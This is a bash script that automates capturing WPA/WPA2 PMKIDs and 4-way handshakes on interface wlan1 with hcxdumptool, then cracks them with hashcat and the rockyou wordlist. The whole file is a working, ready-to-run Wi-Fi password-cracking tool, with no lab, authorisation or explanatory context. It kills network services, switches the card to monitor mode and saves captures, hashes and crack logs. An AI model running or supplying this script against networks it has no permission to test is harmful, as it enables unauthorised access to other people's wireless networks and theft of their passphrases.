#!/usr/bin/env bash
# psk_quick_wlan1.sh — Quick PMKID/4-way capture & crack on wlan1
# Usage:
#   sudo ./psk_quick_wlan1.sh <CHANNEL> [DURATION_SEC] [WORDLIST_PATH]
# Example:
#   sudo ./psk_quick_wlan1.sh 6 180 /usr/share/wordlists/rockyou.txt
set -Eeuo pipefail
CH="${1:?Usage: sudo $0 <CHANNEL> [DURATION_SEC] [WORDLIST_PATH]}"
DUR="${2:-180}"
WORDLIST="${3:-/usr/share/wordlists/rockyou.txt}"
IFACE="${IFACE:-wlan1}"

PCAP_DIR="${HOME}/wifi/pcap"
HASH_DIR="${HOME}/wifi/hashes"
LOG_DIR="${HOME}/wifi/logs"
mkdir -p "$PCAP_DIR" "$HASH_DIR" "$LOG_DIR"

need() { command -v "$1" >/dev/null 2>&1 || { echo "[!] Missing: $1"; MISSING=1; }; }
MISSING=0
for c in iw ip airmon-ng hcxdumptool hcxpcapngtool hashcat; do need "$c"; done
if (( MISSING )); then
  echo "[!] Install: sudo apt install aircrack-ng hcxdumptool hcxtools hashcat"
  exit 1
fi

ts(){ date +%F_%H%M%S; }
OUT="$PCAP_DIR/pmkid_${CH}_$(ts).pcapng"
H22000="$HASH_DIR/psk_${CH}_$(ts).22000"
CRACK_LOG="$LOG_DIR/hashcat_${CH}_$(ts).log"

echo "[*] Regulatory -> PL"; sudo iw reg set PL || true
echo "[*] Kill NM/wpa_supplicant"; sudo airmon-ng check kill || true
echo "[*] Monitor mode on ${IFACE}"; sudo ip link set "$IFACE" down; sudo iw dev "$IFACE" set type monitor; sudo ip link set "$IFACE" up
echo "[*] Set channel $CH"; sudo iw dev "$IFACE" set channel "$CH"

echo "[*] Capturing PMKID/handshake for ${DUR}s -> $OUT"
sudo timeout "${DUR}s" hcxdumptool -i "$IFACE" -o "$OUT" --enable_status=1 || true

echo "[*] Converting to hashcat format -> $H22000"
hcxpcapngtool -o "$H22000" "$OUT"

if [[ -s "$H22000" ]]; then
  echo "[*] Running hashcat (wordlist: $WORDLIST)"
  hashcat -m 22000 "$H22000" "$WORDLIST" -O --status --status-timer=60 | tee "$CRACK_LOG" || true
  echo "[*] Finished. Hashes: $H22000 ; Log: $CRACK_LOG"
else
  echo "[!] No hashes extracted. Try longer capture or different client activity."
fi

echo "[i] To restore networking: sudo ./wifi_teardown.sh ${IFACE}"
